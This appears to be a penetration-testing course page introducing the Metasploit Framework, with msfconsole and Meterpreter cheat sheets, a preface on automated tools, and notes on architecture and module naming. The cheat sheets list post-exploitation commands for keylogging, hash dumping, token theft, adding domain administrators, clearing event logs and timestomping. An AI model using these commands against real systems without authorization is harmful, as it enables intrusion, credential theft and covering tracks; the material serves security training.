
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="7-using-the-metasploit-framework">7. Using the Metasploit Framework</h1>
<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<h3 id="msfconsole-commands">MSFconsole Commands</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>show exploits</code></td>
<td>Show all exploits within the Framework.</td>
</tr>
<tr>
<td><code>show payloads</code></td>
<td>Show all payloads within the Framework.</td>
</tr>
<tr>
<td><code>show auxiliary</code></td>
<td>Show all auxiliary modules within the Framework.</td>
</tr>
<tr>
<td><code>search &lt;name&gt;</code></td>
<td>Search for exploits or modules within the Framework.</td>
</tr>
<tr>
<td><code>info</code></td>
<td>Load information about a specific exploit or module.</td>
</tr>
<tr>
<td><code>use &lt;name&gt;</code></td>
<td>Load an exploit or module (example: use windows/smb/psexec).</td>
</tr>
<tr>
<td><code>use &lt;number&gt;</code></td>
<td>Load an exploit by using the index number displayed after the search command.</td>
</tr>
<tr>
<td><code>LHOST</code></td>
<td>Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.</td>
</tr>
<tr>
<td><code>RHOST</code></td>
<td>The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).</td>
</tr>
<tr>
<td><code>setg &lt;function&gt;</code></td>
<td>Set a specific value globally (for example, LHOST or RHOST).</td>
</tr>
<tr>
<td><code>show options</code></td>
<td>Show the options available for a module or exploit.</td>
</tr>
<tr>
<td><code>show targets</code></td>
<td>Show the platforms supported by the exploit.</td>
</tr>
<tr>
<td><code>set target &lt;number&gt;</code></td>
<td>Specify a specific target index if you know the OS and service pack.</td>
</tr>
<tr>
<td><code>set payload &lt;payload&gt;</code></td>
<td>Specify the payload to use.</td>
</tr>
<tr>
<td><code>set payload &lt;number&gt;</code></td>
<td>Specify the payload index number to use after the show payloads command.</td>
</tr>
<tr>
<td><code>show advanced</code></td>
<td>Show advanced options.</td>
</tr>
<tr>
<td><code>set autorunscript migrate -f</code></td>
<td>Automatically migrate to a separate process upon exploit completion.</td>
</tr>
<tr>
<td><code>check</code></td>
<td>Determine whether a target is vulnerable to an attack.</td>
</tr>
<tr>
<td><code>exploit</code></td>
<td>Execute the module or exploit and attack the target.</td>
</tr>
<tr>
<td><code>exploit -j</code></td>
<td>Run the exploit under the context of the job. (This will run the exploit in the background.)</td>
</tr>
<tr>
<td><code>exploit -z</code></td>
<td>Do not interact with the session after successful exploitation.</td>
</tr>
<tr>
<td><code>exploit -e &lt;encoder&gt;</code></td>
<td>Specify the payload encoder to use (example: exploit –e shikata_ga_nai).</td>
</tr>
<tr>
<td><code>exploit -h</code></td>
<td>Display help for the exploit command.</td>
</tr>
<tr>
<td><code>sessions -l</code></td>
<td>List available sessions (used when handling multiple shells).</td>
</tr>
<tr>
<td><code>sessions -l -v</code></td>
<td>List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.</td>
</tr>
<tr>
<td><code>sessions -s &lt;script&gt;</code></td>
<td>Run a specific Meterpreter script on all Meterpreter live sessions.</td>
</tr>
<tr>
<td><code>sessions -K</code></td>
<td>Kill all live sessions.</td>
</tr>
<tr>
<td><code>sessions -c &lt;cmd&gt;</code></td>
<td>Execute a command on all live Meterpreter sessions.</td>
</tr>
<tr>
<td><code>sessions -u &lt;sessionID&gt;</code></td>
<td>Upgrade a normal Win32 shell to a Meterpreter console.</td>
</tr>
<tr>
<td><code>db_create &lt;name&gt;</code></td>
<td>Create a database to use with database-driven attacks (example: db_create autopwn).</td>
</tr>
<tr>
<td><code>db_connect &lt;name&gt;</code></td>
<td>Create and connect to a database for driven attacks (example: db_connect autopwn).</td>
</tr>
<tr>
<td><code>db_nmap</code></td>
<td>Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)</td>
</tr>
<tr>
<td><code>db_destroy</code></td>
<td>Delete the current database.</td>
</tr>
<tr>
<td><code>db_destroy &lt;user:password@host:port/database&gt;</code></td>
<td>Delete database using advanced options.</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="meterpreter-commands">Meterpreter Commands</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>help</code></td>
<td>Open Meterpreter usage help.</td>
</tr>
<tr>
<td><code>run &lt;scriptname&gt;</code></td>
<td>Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.</td>
</tr>
<tr>
<td><code>sysinfo</code></td>
<td>Show the system information on the compromised target.</td>
</tr>
<tr>
<td><code>ls</code></td>
<td>List the files and folders on the target.</td>
</tr>
<tr>
<td><code>use priv</code></td>
<td>Load the privilege extension for extended Meterpreter libraries.</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>Show all running processes and which accounts are associated with each process.</td>
</tr>
<tr>
<td><code>migrate &lt;proc. id&gt;</code></td>
<td>Migrate to the specific process ID (PID is the target process ID gained from the ps command).</td>
</tr>
<tr>
<td><code>use incognito</code></td>
<td>Load incognito functions. (Used for token stealing and impersonation on a target machine.)</td>
</tr>
<tr>
<td><code>list_tokens -u</code></td>
<td>List available tokens on the target by user.</td>
</tr>
<tr>
<td><code>list_tokens -g</code></td>
<td>List available tokens on the target by group.</td>
</tr>
<tr>
<td><code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code></td>
<td>Impersonate a token available on the target.</td>
</tr>
<tr>
<td><code>steal_token &lt;proc. id&gt;</code></td>
<td>Steal the tokens available for a given process and impersonate that token.</td>
</tr>
<tr>
<td><code>drop_token</code></td>
<td>Stop impersonating the current token.</td>
</tr>
<tr>
<td><code>getsystem</code></td>
<td>Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.</td>
</tr>
<tr>
<td><code>shell</code></td>
<td>Drop into an interactive shell with all available tokens.</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i</code></td>
<td>Execute cmd.exe and interact with it.</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i -t</code></td>
<td>Execute cmd.exe with all available tokens.</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i -H -t</code></td>
<td>Execute cmd.exe with all available tokens and make it a hidden process.</td>
</tr>
<tr>
<td><code>rev2self</code></td>
<td>Revert back to the original user you used to compromise the target.</td>
</tr>
<tr>
<td><code>reg &lt;command&gt;</code></td>
<td>Interact, create, delete, query, set, and much more in the target’s registry.</td>
</tr>
<tr>
<td><code>setdesktop &lt;number&gt;</code></td>
<td>Switch to a different screen based on who is logged in.</td>
</tr>
<tr>
<td><code>screenshot</code></td>
<td>Take a screenshot of the target’s screen.</td>
</tr>
<tr>
<td><code>upload &lt;filename&gt;</code></td>
<td>Upload a file to the target.</td>
</tr>
<tr>
<td><code>download &lt;filename&gt;</code></td>
<td>Download a file from the target.</td>
</tr>
<tr>
<td><code>keyscan_start</code></td>
<td>Start sniffing keystrokes on the remote target.</td>
</tr>
<tr>
<td><code>keyscan_dump</code></td>
<td>Dump the remote keys captured on the target.</td>
</tr>
<tr>
<td><code>keyscan_stop</code></td>
<td>Stop sniffing keystrokes on the remote target.</td>
</tr>
<tr>
<td><code>getprivs</code></td>
<td>Get as many privileges as possible on the target.</td>
</tr>
<tr>
<td><code>uictl enable &lt;keyboard/mouse&gt;</code></td>
<td>Take control of the keyboard and/or mouse.</td>
</tr>
<tr>
<td><code>background</code></td>
<td>Run your current Meterpreter shell in the background.</td>
</tr>
<tr>
<td><code>hashdump</code></td>
<td>Dump all hashes on the target. use sniffer Load the sniffer module.</td>
</tr>
<tr>
<td><code>sniffer_interfaces</code></td>
<td>List the available interfaces on the target.</td>
</tr>
<tr>
<td><code>sniffer_dump &lt;interfaceID&gt; pcapname</code></td>
<td>Start sniffing on the remote target.</td>
</tr>
<tr>
<td><code>sniffer_start &lt;interfaceID&gt; packet-buffer</code></td>
<td>Start sniffing with a specific range for a packet buffer.</td>
</tr>
<tr>
<td><code>sniffer_stats &lt;interfaceID&gt;</code></td>
<td>Grab statistical information from the interface you are sniffing.</td>
</tr>
<tr>
<td><code>sniffer_stop &lt;interfaceID&gt;</code></td>
<td>Stop the sniffer.</td>
</tr>
<tr>
<td><code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code></td>
<td>Add a user on the remote target.</td>
</tr>
<tr>
<td><code>add_group_user &lt;&quot;Domain Admins&quot;&gt; &lt;username&gt; -h &lt;ip&gt;</code></td>
<td>Add a username to the Domain Administrators group on the remote target.</td>
</tr>
<tr>
<td><code>clearev</code></td>
<td>Clear the event log on the target machine.</td>
</tr>
<tr>
<td><code>timestomp</code></td>
<td>Change file attributes, such as creation date (antiforensics measure).</td>
</tr>
<tr>
<td><code>reboot</code></td>
<td>Reboot the target machine.</td>
</tr>
</tbody>
</table>
<h2 id="preface">Preface</h2>
<hr>
<p>Tools have recently seen heated debates within the security industry&#39;s social media circles. Some discussions revolved around the personal preference of some groups, while others aimed towards the evaluation of tool disclosure policies to the public. Nevertheless, there is a need to point out the importance of automated tools in the industry today.</p>
<p>The general opinion we have indeed heard or will hear is that using automated tools during a security assessment is not the right choice. This is because they offer the security analyst or penetration tester no chance to &#39;prove&#39; themselves when interacting with a vulnerable environment. Furthermore, many say that tools make the job too easy for the auditor to receive any recognition for their assessment.</p>
<p>Another vocal group disagrees - those consisting of newer members of the infosec community, who are just starting and making their first steps, and those who sustain the argument that tools help us learn better by offering us a more user-friendly approach to the plethora of vulnerabilities that exist in the wild while saving us time for the more intricate parts of an assessment. We will also be taking this confrontational approach to the issue.</p>
<p>Tools can indeed, in some cases, present us with some downsides:</p>
<ul>
<li>Create a comfort zone that will be hard to break out of to learn new skills</li>
<li>Create a security risk just because they are published online for everyone to see and use</li>
<li>Create a tunnel vision effect. <code>If the tool cannot do it, neither can I.</code></li>
</ul>
<p>Like in other industries where the creative part of the work can be combined with automated tasks, tools can limit our view and actions as new users. We can mistakenly <code>learn</code> that they provide the solutions to all problems, and we start to rely on them more and more. This, in turn, creates a tunnel vision effect that can and will limit the possible interactions that the user might think about and act upon for their assessment.</p>
<p>At the same time, the fact that more and more of these automated tools make their way into the public sector (see the NSA release of security tools to the public) creates more possibilities for would-be malicious actors with little to no knowledge of the industry to act upon their desires to make a quick profit or flaunt their endeavors inside dark rooms filled with smaller people.</p>
<hr>
<h3 id="discipline">Discipline</h3>
<p>If there are any discerning factors to be drawn from the current state of the information security industry, they are to be drawn on the premise that we are in a continuous, accelerated evolution of existing technologies, protocols, and systems. With the cumulus of environment variables that we encounter during an assessment, time must be saved where it can, and a strong security paradigm is formed for the auditor. Discipline is critical in all fields of work, and the conclusions are as follows:</p>
<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>We will never have enough time to complete the assessment. With the number of technologies in use in every single environment variation, we will not be offered the time to do a complete, comprehensive assessment. Time is money, and we are on the clock for a non-tech-savvy customer, and we need to complete the bulk of the work first: the issues with the most potential impact and highest remediation turnover.</td>
</tr>
<tr>
<td>Credibility can be an issue even if we make our tools or manually exploit every service. We are not competing against other industry members but rather against pre-set economic conditions and personal beliefs from the customer management level. They would not comprehend or give much importance to accolades. They just want the work done in the highest possible quantity, in the least amount of time.</td>
</tr>
<tr>
<td>You only have to impress yourself, not the infosec community. If we achieve the first, the latter will come naturally. Using the same example as above, many artists with an online presence stray from their original goals in pursuit of online validation. Their art becomes stale and generic to the keen eye, but to the everyday user, it contains the wanted visual elements and themes, not those their followers do not yet know they want. As security researchers or penetration testers, we only must validate vulnerabilities, not validate our ego.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="conclusion">Conclusion</h3>
<p>We have to analyze and know our tools inside and out to keep our tracks covered and avoid a cataclysmic event during our assessment. Many tools can prove to be unpredictable. Some can leave traces of activity on the target system, and some may leave our attacker platform with open gates. Nevertheless, as long as we follow the rules here, they can be a valuable educational platform for beginners and a needed time-saver mechanism for professionals.</p>
<p>Do not get tunnel vision. Use the tool as a tool, not as a backbone or life support for our complete assessment.</p>
<p>Please read all the technical documentation you can find for any of our tools. Please get to know them intimately. Leave no stone (or function or class) unturned. This will help us avoid unintended behaviors or an irate customer and a team of lawyers.</p>
<p>Suppose we audit our tools and set ourselves up with a solid methodology for preliminary checks and attack paths. In that case, tools will save us time for further research and a long-lasting concrete exploration of our security research paradigm. Considering the accelerated pace at which more and more technologies appear in today&#39;s environments, this further research should focus on a deeper understanding of security mechanisms, furthering our audit towards more abstract security objects on broadening the spectrum under which the analysis is made. This is how we evolve as a professional.</p>
<h2 id="introduction-to-metasploit">Introduction to Metasploit</h2>
<hr>
<p>The <code>Metasploit Project</code> is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The <code>Metasploit Framework</code> includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the <code>Metasploit Project</code> is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/S02\_SS01.png" alt="img"></p>
<p>The <code>modules</code> mentioned are actual exploit proof-of-concepts that have already been developed and tested in the wild and integrated within the framework to provide pentesters with ease of access to different attack vectors for different platforms and services. Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get us through the most common unpatched vulnerabilities.</p>
<p>Its strong suit is that it provides a plethora of available targets and versions, all a few commands away from a successful foothold. These, combined with an exploit tailor-made to those vulnerable versions and with a payload that is sent after the exploit, which will give us actual access into the system, provide us with an easy, automated way to switch between target connections during our post-exploitation ventures.</p>
<hr>
<h3 id="metasploit-pro">Metasploit Pro</h3>
<p><code>Metasploit</code> as a product is split into two versions. The <code>Metasploit Pro</code> version is different from the <code>Metasploit Framework</code> one with some additional features:</p>
<ul>
<li>Task Chains</li>
<li>Social Engineering</li>
<li>Vulnerability Validations</li>
<li>GUI</li>
<li>Quick Start Wizards</li>
<li>Nexpose Integration</li>
</ul>
<p>If you&#39;re more of a command-line user and prefer the extra features, the Pro version also contains its own console, much like <code>msfconsole</code>.</p>
<p>To have a general idea of what Metasploit Pro&#39;s newest features can achieve, check out the list below:</p>
<table>
<thead>
<tr>
<th><strong>Infiltrate</strong></th>
<th><strong>Collect Data</strong></th>
<th><strong>Remediate</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Manual Exploitation</td>
<td>Import and Scan Data</td>
<td>Bruteforce</td>
</tr>
<tr>
<td>Anti-virus Evasion</td>
<td>Discovery Scans</td>
<td>Task Chains</td>
</tr>
<tr>
<td>IPS/IDS Evasion</td>
<td>Meta-Modules</td>
<td>Exploitation Workflow</td>
</tr>
<tr>
<td>Proxy Pivot</td>
<td>Nexpose Scan Integration</td>
<td>Session Rerun</td>
</tr>
<tr>
<td>Post-Exploitation</td>
<td></td>
<td>Task Replay</td>
</tr>
<tr>
<td>Session Clean-up</td>
<td></td>
<td>Project Sonar Integration</td>
</tr>
<tr>
<td>Credentials Reuse</td>
<td></td>
<td>Session Management</td>
</tr>
<tr>
<td>Social Engineering</td>
<td></td>
<td>Credential Management</td>
</tr>
<tr>
<td>Payload Generator</td>
<td></td>
<td>Team Collaboration</td>
</tr>
<tr>
<td>Quick Pen-testing</td>
<td></td>
<td>Web Interface</td>
</tr>
<tr>
<td>VPN Pivoting</td>
<td></td>
<td>Backup and Restore</td>
</tr>
<tr>
<td>Vulnerability Validation</td>
<td></td>
<td>Data Export</td>
</tr>
<tr>
<td>Phishing Wizard</td>
<td></td>
<td>Evidence Collection</td>
</tr>
<tr>
<td>Web App Testing</td>
<td></td>
<td>Reporting</td>
</tr>
<tr>
<td>Persistent Sessions</td>
<td></td>
<td>Tagging Data</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="metasploit-framework-console">Metasploit Framework Console</h3>
<p>The <code>msfconsole</code> is probably the most popular interface to the <code>Metasploit Framework</code> <code>(MSF)</code>. It provides an &quot;all-in-one&quot; centralized console and allows you efficient access to virtually all options available in the <code>MSF</code>. <code>Msfconsole</code> may seem intimidating at first, but once you learn the syntax of the commands, you will learn to appreciate the power of utilizing this interface.</p>
<p>The features that <code>msfconsole</code> generally brings are the following:</p>
<ul>
<li>It is the only supported way to access most of the features within <code>Metasploit</code></li>
<li>Provides a console-based interface to the <code>Framework</code></li>
<li>Contains the most features and is the most stable <code>MSF</code> interface</li>
<li>Full readline support, tabbing, and command completion</li>
<li>Execution of external commands in <code>msfconsole</code></li>
</ul>
<p>Both products mentioned above come with an extensive database of available modules to use in our assessments. These, combined with the use of external commands such as scanners, social engineering toolkits, and payload generators, can turn our setup into a ready-to-strike machine that will allow us to seamlessly control and manipulate different vulnerabilities in the wild with the use of sessions and jobs in the same way we would see tabs on an Internet browser.</p>
<p>The key term here is usability—user experience. The ease with which we can control the console can improve our learning experience. Therefore, let us delve into the specifics.</p>
<hr>
<h3 id="understanding-the-architecture">Understanding the Architecture</h3>
<p>To fully operate whatever tool we are using, we must first look under its hood. It is good practice, and it can offer us better insight into what will be going on during our security assessments when that tool comes into play. It is essential not to have <a href="https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/">any wildcards that might leave you or your client exposed to data breaches</a>.</p>
<p>By default, all the base files related to Metasploit Framework can be found under <code>/usr/share/metasploit-framework</code> in our <code>ParrotOS Security</code> distro.</p>
<p><strong>Data, Documentation, Lib</strong></p>
<p>These are the base files for the Framework. The Data and Lib are the functioning parts of the msfconsole interface, while the Documentation folder contains all the technical details about the project.</p>
<p><strong>Modules</strong></p>
<p>The Modules detailed above are split into separate categories in this folder. We will go into detail about these in the next sections. They are contained in the following folders:</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ ls /usr</span><span class="hljs-regexp">/share/metasploit</span>-framework/modules

auxiliary  encoders  evasion  exploits  nops  payloads  post
</code></pre>
<p><strong>Plugins</strong></p>
<p>Plugins offer the pentester more flexibility when using the <code>msfconsole</code> since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

aggregator<span class="hljs-selector-class">.rb</span>      ips_filter<span class="hljs-selector-class">.rb</span>  openvas<span class="hljs-selector-class">.rb</span>           sounds<span class="hljs-selector-class">.rb</span>
alias<span class="hljs-selector-class">.rb</span>           komand<span class="hljs-selector-class">.rb</span>      pcap_log<span class="hljs-selector-class">.rb</span>          sqlmap<span class="hljs-selector-class">.rb</span>
auto_add_route<span class="hljs-selector-class">.rb</span>  lab<span class="hljs-selector-class">.rb</span>         request<span class="hljs-selector-class">.rb</span>           thread<span class="hljs-selector-class">.rb</span>
beholder<span class="hljs-selector-class">.rb</span>        libnotify<span class="hljs-selector-class">.rb</span>   rssfeed<span class="hljs-selector-class">.rb</span>           token_adduser<span class="hljs-selector-class">.rb</span>
db_credcollect<span class="hljs-selector-class">.rb</span>  msfd<span class="hljs-selector-class">.rb</span>        sample<span class="hljs-selector-class">.rb</span>            token_hunter<span class="hljs-selector-class">.rb</span>
db_tracker<span class="hljs-selector-class">.rb</span>      msgrpc<span class="hljs-selector-class">.rb</span>      session_notifier<span class="hljs-selector-class">.rb</span>  wiki<span class="hljs-selector-class">.rb</span>
event_tester<span class="hljs-selector-class">.rb</span>    nessus<span class="hljs-selector-class">.rb</span>      session_tagger<span class="hljs-selector-class">.rb</span>    wmap<span class="hljs-selector-class">.rb</span>
ffautoregen<span class="hljs-selector-class">.rb</span>     nexpose<span class="hljs-selector-class">.rb</span>     socket_logger.rb
</code></pre>
<p><strong>Scripts</strong></p>
<p>Meterpreter functionality and other useful scripts.</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ls /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/scripts/</span>

meterpreter  ps  resource  shell
</code></pre>
<p><strong>Tools</strong></p>
<p>Command-line utilities that can be called directly from the <code>msfconsole</code> menu.</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ls /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/tools/</span>

context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
</code></pre>
<h2 id="introduction-to-msfconsole">Introduction to MSFconsole</h2>
<hr>
<p>To start interacting with the Metasploit Framework, we need to type <code>msfconsole</code> in the terminal of our choice. Many security-oriented distributions such as Parrot Security and Kali Linux come with <code>msfconsole</code> preinstalled. We can use several other options when launching the script as with any other command-line tool. These vary from graphical display switches/options to procedural ones.</p>
<hr>
<h3 id="preparation">Preparation</h3>
<p>Upon launching the <code>msfconsole</code>, we are met with their coined splash art and the command line prompt, waiting for our first command.</p>
<p><strong>Launching MSFconsole</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ msfconsole

                                              <span class="hljs-string">`:oDFo:`</span>                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    <span class="hljs-string">`:sm⏣~~Destroy.No.Data~~s:`</span>                
                                 -+h2~~<span class="hljs-symbol">Maintain</span>.<span class="hljs-symbol">No</span>.<span class="hljs-symbol">Persistence</span>~~h+-              
                             <span class="hljs-string">`:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`</span>          
                          ./etc/shadow<span class="hljs-number">.0</span>days-<span class="hljs-symbol">Data</span><span class="hljs-string">'%20OR%201=1--.No.0MN8'</span>/.      
                       -++<span class="hljs-symbol">SecKCoin</span>++e.<span class="hljs-symbol">AMd</span><span class="hljs-string">`       `</span>.-://///+hbove<span class="hljs-number">.913</span>.<span class="hljs-symbol">ElsMNh</span>+-    
                      -~/.ssh/id_rsa.<span class="hljs-symbol">Des</span>-                  <span class="hljs-string">`htN01UserWroteMe!-  
                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`</span>                     <span class="hljs-symbol">The</span>.<span class="hljs-symbol">PFYroy</span>.<span class="hljs-symbol">No</span>.<span class="hljs-symbol">D7</span>:  
                      :<span class="hljs-symbol">PLACEDRINKHERE</span>!:                      yxp_cmdshell.<span class="hljs-symbol">Ab0</span>:    
                      :msf&gt;exploit -j.                       :<span class="hljs-symbol">Ns</span>.<span class="hljs-symbol">BOB</span>&amp;<span class="hljs-symbol">ALICEes7</span>:    
                      :---srwxrwx:-.<span class="hljs-string">`                        `</span><span class="hljs-symbol">MS146</span><span class="hljs-number">.52</span>.<span class="hljs-symbol">No</span>.<span class="hljs-symbol">Per</span>:    
                      :&lt;script&gt;.<span class="hljs-symbol">Ac816</span>/                        sENbove3101<span class="hljs-number">.404</span>:    
                      :<span class="hljs-symbol">NT_AUTHORITY</span>.<span class="hljs-symbol">Do</span>                        <span class="hljs-string">`T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `</span>dDestRoyREXKC3ta/<span class="hljs-symbol">M</span>:    
                      :<span class="hljs-number">23</span>d:                               sSETEC.<span class="hljs-symbol">ASTRONOMYist</span>:    
                       /-                        /yo-    .ence.<span class="hljs-symbol">N</span>:(){ :|: &amp; };:    
                                                 <span class="hljs-string">`:Shall.We.Play.A.Game?tron/    
                                                 `</span><span class="hljs-string">``</span>-ooy.if1ghtf0r+ehUser5<span class="hljs-string">`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`</span>          
                                              <span class="hljs-string">`MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`</span>                  
                                                <span class="hljs-symbol">J</span>~<span class="hljs-symbol">HAKCERS</span>~./.<span class="hljs-string">`                    
                                                .esc:wq!:`</span>                        
                                                 +++<span class="hljs-symbol">ATH</span><span class="hljs-string">`                            
                                                  `</span>


       =[ metasploit v6<span class="hljs-number">.1</span><span class="hljs-number">.9</span>-dev                           ]
+ -- --=[ <span class="hljs-number">2169</span> exploits - <span class="hljs-number">1149</span> auxiliary - <span class="hljs-number">398</span> post       ]
+ -- --=[ <span class="hljs-number">592</span> payloads - <span class="hljs-number">45</span> encoders - <span class="hljs-number">10</span> nops            ]
+ -- --=[ <span class="hljs-number">9</span> evasion                                       ]

<span class="hljs-symbol">Metasploit</span> tip: <span class="hljs-symbol">Use</span> sessions <span class="hljs-number">-1</span> to interact with the last opened session

msf6 &gt;
</code></pre>
<p>Alternatively, we can use the <code>-q</code> option, which does not display the banner.</p>
<pre><code class="lang-shell-session">[!bash!]$ msfconsole -q

msf6 &gt;
</code></pre>
<p>To better look at all the available commands, we can type the <code>help</code> command. First things first, our tools need to be sharp. One of the first things we need to do is make sure the modules that compose the framework are up to date, and any new ones available to the public can be imported.</p>
<p>The old way would have been to run <code>msfupdate</code> in our OS terminal (outside <code>msfconsole</code>). However, the <code>apt</code> package manager can currently handle the update of modules and features effortlessly.</p>
<p><strong>Installing MSF</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ sudo apt update &amp;&amp; sudo apt install metasploit-framework

&lt;SNIP&gt;

(Reading database ... <span class="hljs-number">414458</span> files and directories currently installed.)
Preparing to unpack .../metasploit-framework_6<span class="hljs-number">.0</span><span class="hljs-number">.2</span><span class="hljs-number">-0</span>parrot1_amd64.deb ...
Unpacking metasploit-framework (<span class="hljs-number">6.0</span><span class="hljs-number">.2</span><span class="hljs-number">-0</span>parrot1) over (<span class="hljs-number">5.0</span><span class="hljs-number">.88</span><span class="hljs-number">-0</span>kali1) ...
Setting up metasploit-framework (<span class="hljs-number">6.0</span><span class="hljs-number">.2</span><span class="hljs-number">-0</span>parrot1) ...
Processing triggers for man-db (<span class="hljs-number">2.9</span><span class="hljs-number">.1</span><span class="hljs-number">-1</span>) ...
Scanning application launchers
Removing duplicate launchers from Debian
Launchers are updated
</code></pre>
<p>One of the first steps we will cover in this module is searching for a proper <code>exploit</code> for our <code>target</code>. Nevertheless, we need to have a detailed perspective on the <code>target</code> itself before attempting any exploitation. This involves the <code>Enumeration</code> process, which precedes any type of exploitation attempt.</p>
<p>During <code>Enumeration</code>, we have to look at our target and identify which public-facing services are running on it. For example, is it an HTTP server? Is it an FTP server? Is it an SQL Database? These different <code>target</code> typologies vary substantially in the real world. We will need to start with a thorough <code>scan</code> of the target&#39;s IP address to determine what service is running and what version is installed for each service.</p>
<p>We will notice as we go along that versions are the key components during the <code>Enumeration</code> process that will allow us to determine if the target is vulnerable or not. Unpatched versions of previously vulnerable services or outdated code in a publicly accessible platform will often be our entry point into the <code>target</code> system.</p>
<hr>
<h3 id="msf-engagement-structure">MSF Engagement Structure</h3>
<p>The MSF engagement structure can be divided into five main categories.</p>
<ul>
<li>Enumeration</li>
<li>Preparation</li>
<li>Exploitation</li>
<li>Privilege Escalation</li>
<li>Post-Exploitation</li>
</ul>
<p>This division makes it easier for us to find and select the appropriate MSF features in a more structured way and to work with them accordingly. Each of these categories has different subcategories that are intended for specific purposes. These include, for example, Service Validation and Vulnerability Research.</p>
<p>It is therefore crucial that we familiarize ourselves with this structure. Therefore, we will look at this framework&#39;s components to better understand how they are related.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/S04\_SS03.png" alt="image"></p>
<p>We will go through each of these categories during the module, but we recommend looking at the individual components ourselves and digging deeper. Experimenting with the different functions is an integral part of learning a new tool or skill. Therefore, we should try out everything imaginable here in the following labs and analyze the results independently.</p>
<h2 id="modules">Modules</h2>
<hr>
<p>As we mentioned previously, Metasploit <code>modules</code> are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. The <code>exploit</code> category consists of so-called proof-of-concept (<code>POCs</code>) that can be used to exploit existing vulnerabilities in a largely automated manner. Many people often think that the failure of the exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and not that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for our manual skills.</p>
<p>Once we are in the <code>msfconsole</code>, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:</p>
<p><strong>Syntax</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session"><span class="hljs-tag">&lt;<span class="hljs-name">No.</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">os</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>
</code></pre>
<p><strong>Example</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">794 </span>  exploit/windows/ftp/scriptftp_list
</code></pre>
<p><strong>Index No.</strong></p>
<p>The <code>No.</code> tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the <code>No.</code> tag can be to select specific Metasploit modules later.</p>
<p><strong>Type</strong></p>
<p>The <code>Type</code> tag is the first level of segregation between the Metasploit <code>modules</code>. Looking at this field, we can tell what the piece of code for this module will accomplish. Some of these <code>types</code> are not directly usable as an <code>exploit</code> module would be, for example. However, they are set to introduce the structure alongside the interactable ones for better modularization. To explain better, here are the possible types that could appear in this field:</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
